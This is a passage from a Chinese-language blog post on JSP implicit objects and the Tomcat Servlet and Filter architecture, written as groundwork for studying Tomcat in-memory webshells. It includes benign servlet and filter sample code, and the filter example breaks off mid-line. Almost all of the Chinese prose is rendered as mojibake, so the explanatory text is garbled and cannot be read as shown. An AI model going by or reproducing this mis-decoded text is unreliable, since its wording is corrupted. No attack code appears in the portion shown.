</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">    request.setAttribute(&#34;name&#34;,&#34;fupanc&#34;);	//å¾€requestå¯¹è±¡ä¸­å­˜å‚¨ä¸€ä¸ªå€¼  key-valueçš„å½¢å¼
</span></span><span class="line"><span class="cl">    request.setCharacterEncoding(&#34;utf-8&#34;);	//è®¾ç½®ç¼–ç æ ¼å¼
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    request.getParameter(&#34;&#34;);//è·å–æäº¤çš„æŒ‡å®šå‚æ•°çš„å€¼
</span></span><span class="line"><span class="cl">    request.getParameterNames();//è¿”å›è¯·æ±‚ä¸­æ‰€æœ‰å‚æ•°çš„é›†åˆ
</span></span><span class="line"><span class="cl">    request.getParameterValues(&#34;&#34;);//è·å–åŒ…å«æŒ‡å®šå‚æ•°çš„æ‰€æœ‰å€¼çš„æ•°ç»„
</span></span><span class="line"><span class="cl">    request.getAttributeNames();//è·å–æ‰€æœ‰å±æ€§åç§°é›†åˆ
</span></span><span class="line"><span class="cl">    request.getAttribute(&#34;name&#34;);//è·å–æŒ‡å®šå±æ€§çš„å±æ€§å€¼,å¦‚æœä¸å­˜åœ¨è¿”å›null
</span></span><span class="line"><span class="cl">    request.getCharacterEncoding();//è·å–ç¼–ç æ ¼å¼
</span></span><span class="line"><span class="cl">    request.getProtocol();//è·å–HTTPä½¿ç”¨çš„åè®®
</span></span><span class="line"><span class="cl">    request.getServletPath();//è·å–ç”¨æˆ·æäº¤ä¿¡æ¯çš„é¡µé¢çš„è·¯å¾„
</span></span><span class="line"><span class="cl">    request.getMethod();//è·å–ç”¨æˆ·æäº¤çš„æ–¹å¼ï¼ˆGET/POST ç­‰ï¼‰
</span></span><span class="line"><span class="cl">    request.getHeaderNames();//è¿”å›æ‰€æœ‰HTTPå¤´çš„åç§°é›†åˆ
</span></span><span class="line"><span class="cl">    request.getHeader(&#34;&#34;);//è·å–headerä¸­æŒ‡å®šå±æ€§çš„å€¼
</span></span><span class="line"><span class="cl">    request.getRemoteAddr();//è·å–ç”¨æˆ·çš„ipåœ°å€
</span></span><span class="line"><span class="cl">    request.getRemoteHost();//è·å–ç”¨æˆ·çš„ä¸»æœºå
</span></span><span class="line"><span class="cl">    request.getServerName();//è·å–æœåŠ¡å™¨çš„åç§°
</span></span><span class="line"><span class="cl">    request.getServerPort();//è·å–æœåŠ¡å™¨ç«¯å£å·
</span></span><span class="line"><span class="cl">    request.getCookies();//è¿”å›å®¢æˆ·ç«¯æ‰€æœ‰çš„Cookieçš„æ•°ç»„
</span></span><span class="line"><span class="cl">    request.getSession();//è¿”å›requestå¯¹åº”çš„sessionå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åˆ›å»ºä¸€ä¸ª
</span></span><span class="line"><span class="cl">    request.getInputStream();//è¿”å›è¯·æ±‚çš„è¾“å…¥æµ
</span></span><span class="line"><span class="cl">    request.getContextPath();//è¿”å›request URIä¸­æŒ‡æ˜çš„ä¸Šä¸‹æ–‡è·¯å¾„
</span></span><span class="line"><span class="cl">    request.getRequestDispatcher(&#34;result.jsp&#34;).forward(request,response);//è¯·æ±‚è½¬å‘
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>responseå¯¹è±¡</strong>å¯¹åº”ç€httpè¯·æ±‚çš„å“åº”ï¼Œå…¶å°è£…äº†å“åº”ä½“çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡responseå¯¹è±¡å‘å®¢æˆ·ç«¯è¿”å›æ•°æ®ã€‚</li>
</ul>
<p>å¸¸ç”¨æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">response.getOutputStream();//è¿”å›ä¸€ä¸ªå“åº”äºŒè¿›åˆ¶çš„è¾“å‡ºæµ
</span></span><span class="line"><span class="cl">response.getWrite();//è¿”å›å¯ä»¥è¾“å‡ºå­—ç¬¦çš„å¯¹è±¡
</span></span><span class="line"><span class="cl">response.sendRedirect(&#34;&#34;);//é¡µé¢é‡å®šå‘
</span></span><span class="line"><span class="cl">response.setContextLength(1000);//è®¾ç½®å“åº”å¤´é•¿åº¦
</span></span><span class="line"><span class="cl">response.setContentType(&#34;text/html; charset=utf-8&#34;);//è®¾ç½®å“åº”çš„MIMEç±»å‹
</span></span><span class="line"><span class="cl">response.getCharacterEncoding();//è·å–ç¼–ç æ ¼å¼
</span></span><span class="line"><span class="cl">response.addCookie(new Cookie(&#34;&#34;,&#34;&#34;));//æ·»åŠ Cookie
</span></span><span class="line"><span class="cl">response.setHeader(&#34;Content-Disposition&#34;,&#34;attachment; filename=fileName&#34;);//é…ç½®headerï¼Œè¡¨ç¤ºæµè§ˆå™¨å·²ä¸‹è½½çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶
</span></span><span class="line"><span class="cl">response.setStatus(200);//è®¾ç½®å“åº”ç 
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>sessionå¯¹è±¡ç”¨æ¥è·Ÿè¸ªåœ¨å„ä¸ªåˆ»ç”»æ®µè¯·æ±‚é—´çš„ä¼šè¯ã€‚</li>
</ul>
<p>sessionä¸»è¦ç”¨äºä¼šè¯è·Ÿè¸ªï¼Œå¯ä»¥ç”¨æ¥å…±äº«æ•°æ®ï¼Œä¾‹å¦‚ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ç­‰ç­‰ã€‚</p>
<p>ä¸€æ¬¡ä¼šè¯å¯èƒ½åŒ…å«å¯¹æ­¤requestå’Œresponseã€‚</p>
<p>å¸¸ç”¨æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">    session.setAttribute(&#34;name&#34;, &#34;yzq&#34;); 
</span></span><span class="line"><span class="cl">    session.setAttribute(&#34;age&#34;, 25);
</span></span><span class="line"><span class="cl">    session.getCreationTime();//è·å–åˆ›å»ºæ—¶é—´
</span></span><span class="line"><span class="cl">    session.getId();//è·å–sessionid
</span></span><span class="line"><span class="cl">    session.invalidate();//å–æ¶ˆsessionï¼Œä½¿sessionä¸å¯ç”¨
</span></span><span class="line"><span class="cl">    session.removeAttribute(&#34;name&#34;);//ç§»é™¤æŸä¸ªå±æ€§
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>outå¯¹è±¡</strong>ç”¨äºåœ¨responseå¯¹è±¡ä¸­å†™å…¥å†…å®¹ï¼Œæœ‰å¦‚ä¸‹æ–¹æ³•ç”¨æ¥è¾“å‡ºï¼š</li>
</ul>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>æ–¹æ³•</th>
          <th>æè¿°</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>out.print(data Type dt)</td>
          <td>è¾“å‡ºTypeç±»å‹çš„å€¼</td>
      </tr>
      <tr>
          <td>out.println(data Type dt)</td>
          <td>è¾“å‡ºTypeç±»å‹çš„å€¼ç„¶åæ¢è¡Œ</td>
      </tr>
      <tr>
          <td>out.flush()</td>
          <td>åˆ·æ–°è¾“å‡ºæµ</td>
      </tr>
  </tbody>
</table></div>
<p>ç­‰</p>
<p>è¿˜æœ‰çš„å…¶ä»–JSPæŠ€æœ¯å‚è€ƒèœé¸Ÿæ•™ç¨‹çš„ï¼š<code>https://www.runoob.com/jsp/jsp-tutorial.html</code></p>
<h3 id="tomcatæ¶æ„å­¦ä¹ ">Tomcatæ¶æ„å­¦ä¹ 
</h3><p>å­¦ä¹ Tomcatå†…å­˜é©¬ï¼Œè‡ªç„¶éœ€è¦å­¦ä¹ Tomcatæ¶æ„ã€‚</p>
<h4 id="java-webä¸‰å¤§ä»¶">Java Webä¸‰å¤§ä»¶
</h4><p>Java Webä¸‰å¤§ä»¶ï¼šServletï¼ŒFilterï¼ŒListenerã€‚</p>
<p>å½“Tomcatçš„webåº”ç”¨ç¨‹åº æ¥æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™ï¼Œä¾æ¬¡ä¼šç»è¿‡ Listener -&gt; Filter -&gt; Servlet</p>
<h5 id="servlet">Servlet
</h5><p>Java Servlet æ˜¯è¿è¡Œåœ¨WebæœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„å°å‹Javaç¨‹åºï¼Œä¸€èˆ¬æ˜¯ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„åŠ¨æ€èµ„æºã€‚</p>
<h6 id="è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹">è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹
</h6><ul>
<li>å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼Œæ¯”å¦‚getç±»å‹</li>
<li>Servlet å®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆ HttpServletRequest å’Œ HttpServletResponse å¯¹è±¡ã€‚</li>
<li>Servlet å®¹å™¨è°ƒç”¨ HttpServlet çš„ init()æ–¹æ³•ï¼Œinitæ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚</li>
<li>Servlet å®¹å™¨è°ƒç”¨ service() æ–¹æ³•</li>
<li>service() æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ã€‚</li>
<li>doXXXæ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰çš„ä¸šåŠ¡é€»è¾‘ã€‚</li>
<li>ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™Servlet å®¹å™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li>
<li>å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨ destory æ–¹æ³•ã€‚</li>
</ul>
<p>ä»¥ä¸Šæµç¨‹å¯ä»¥ç”¨å¦‚ä¸‹å›¾ç‰‡æ¥è¯´æ˜ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250924135426542.png"
	
	
	
	loading="lazy"
	
		alt="image-20250924135426542"
	
	
></p>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯</strong>ï¼šæ¯æ¬¡å¯åŠ¨tomcatæ‰ä¼šåˆå§‹åŒ–Servletå®¹å™¨ï¼Œè€Œæ¯æ¬¡å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚éƒ½ä¼šå®ä¾‹åŒ–ä¸€ä¸ªServletå®ä¾‹ï¼ˆservlet å®ä¾‹é€šå¸¸åªç”Ÿæˆä¸€æ¬¡ï¼ˆæˆ–æŒ‰é…ç½®ç­–ç•¥ç”Ÿæˆï¼‰ï¼Œç„¶åè¢«å®¹å™¨å¤ç”¨ï¼‰ï¼Œæ¯æ¬¡è¯·æ±‚æ—¶ï¼Œå®¹å™¨ä¼šè°ƒç”¨ Servlet å®ä¾‹çš„ <code>service()</code> æ–¹æ³•æ¥å¤„ç†è¯·æ±‚ï¼Œå†çœ‹æ˜¯è°ƒç”¨åç«¯å®ç°çš„doGet()è¿˜æ˜¯doPost()ç­‰ï¼Œåç«¯çš„æ‰§è¡Œä»£ç ä¼šå°†æ‰§è¡Œç»“æœå†è¿”å›ç»™servletå®¹å™¨ï¼Œå®¹å™¨å†è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œç”±æ­¤æ˜¯ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ã€‚</p>
<p>æ¯”å¦‚å°±å¯ä»¥ç”¨å¦‚ä¸‹ä»£ç æ¥è‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletException</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebServlet</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServlet</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebServlet</span><span class="p">(</span><span class="s">&#34;/TestServlet&#34;</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestServlet</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="s">&#34;hello Drunbaby&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doPost</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å½“GETè¯·æ±‚<code>/TestServlet</code>æ—¶ï¼Œtomcatå°±ä¼šæ ¹æ® URL <code>/TestServlet</code> æ‰¾åˆ°å¯¹åº”çš„ Servletï¼ˆé€šè¿‡ <code>@WebServlet</code> æ³¨è§£æˆ– web.xml é…ç½®æ˜ å°„ï¼‰ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å®ç°çš„ä»£ç ï¼Œæœ€åå¯ä»¥å®ç°æ§åˆ¶responseã€‚</p>
<h6 id="servlet-ç”Ÿå‘½å‘¨æœŸ">servlet ç”Ÿå‘½å‘¨æœŸ
</h6><ol>
<li>æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼ˆweb.xml ä¸­é…ç½® load-on-startup=1ï¼Œé»˜è®¤ä¸º0ï¼‰æˆ–è€…ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥servletæ—¶ï¼Œæœºä¼šåˆå§‹åŒ–ä¸€ä¸ª Servlet å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œåˆå§‹åŒ–æ–¹æ³• init(ServletConfig conf)ã€‚</li>
<li>servlet å¯¹è±¡å»å¤„ç†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚ï¼Œåœ¨ service(ServletRequest reqï¼ŒServletResponse res)æ–¹æ³•ä¸­æ‰§è¡Œ</li>
<li>æœåŠ¡å™¨å…³é—­æ—¶ï¼Œé”€æ¯è¿™ä¸ª servlet å¯¹è±¡ï¼Œæ‰§è¡Œ destory() æ–¹æ³•ã€‚</li>
<li>ç”± JVMè¿›è¡Œåƒåœ¾å›æ”¶ã€‚</li>
</ol>
<h5 id="filter">Filter
</h5><p>filter ä¹Ÿç§°ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ Servlet æŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯å¯¹webèµ„æºè¿›è¡Œæ‹¦æˆªï¼Œåšä¸€äº›å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–servletå¤„ç†ã€‚é€šå¸¸éƒ½æ˜¯ç”¨æ¥æ‹¦æˆªrequestè¿›è¡Œå¤„ç†ï¼Œä¹Ÿå¯ä»¥å¯¹è¿”å›çš„responseè¿›è¡Œæ‹¦æˆªå¤„ç†ã€‚</p>
<p>å·¥ä½œåŸç†å¦‚å›¾ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055407.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240830173409155"
	
	
></p>
<h6 id="åŸºæœ¬å·¥ä½œåŸç†">åŸºæœ¬å·¥ä½œåŸç†
</h6><ol>
<li>Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„Javaç±»ï¼Œä¸Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±Servletå®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„</li>
<li>å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ªFilter æ¥å¯¹æŸä¸ªServletç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚</li>
<li>å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet  è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”±  doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚</li>
<li>ä½†åœ¨ Filter.doFilter æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨  FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ˜¯é€šè¿‡  Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚</li>
<li>åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚</li>
<li>å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚</li>
</ol>
<h6 id="filterçš„ç”Ÿå‘½å‘¨æœŸ">Filterçš„ç”Ÿå‘½å‘¨æœŸ
</h6><p>ä¸ servlet ä¸€æ ·ï¼ŒFilter çš„åˆ›å»ºå’Œé”€æ¯ä¹Ÿç”± Web å®¹å™¨è´Ÿè´£ã€‚<strong>Web åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼ŒWeb æœåŠ¡å™¨å°†åˆ›å»º Filter  çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ init() æ–¹æ³•ï¼Œè¯»å– web.xml é…ç½®ï¼Œå®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–åŠŸèƒ½ï¼Œä»è€Œä¸ºåç»­çš„ç”¨æˆ·è¯·æ±‚ä½œå¥½æ‹¦æˆªçš„å‡†å¤‡å·¥ä½œ</strong>ï¼ˆfilter å¯¹è±¡åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œinit  æ–¹æ³•ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚å¼€å‘äººå‘˜é€šè¿‡initæ–¹æ³•çš„å‚æ•°ï¼Œå¯è·å¾—ä»£è¡¨å½“å‰filteré…ç½®ä¿¡æ¯çš„FilterConfigå¯¹è±¡ã€‚</p>
<p>Filter  å¯¹è±¡åˆ›å»ºåä¼šé©»ç•™åœ¨å†…å­˜ï¼Œå½“ Web åº”ç”¨ç§»é™¤æˆ–æœåŠ¡å™¨åœæ­¢æ—¶æ‰é”€æ¯ï¼Œå³ä¼šæ‰§è¡Œdestroyæ–¹æ³•ã€‚åœ¨ Web å®¹å™¨å¸è½½ Filter å¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ã€‚è¯¥æ–¹æ³•åœ¨ Filter  çš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥é‡Šæ”¾è¿‡æ»¤å™¨ä½¿ç”¨çš„èµ„æºã€‚</p>
<p>å¯ä»¥ç”¨ä¸‹ä»£ç è‡ªå®šä¹‰Filterï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebFilter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpSession</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebFilter</span><span class="p">(</span><span class="s">&#34;/admin/*&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Testfilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Testfilter init&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span 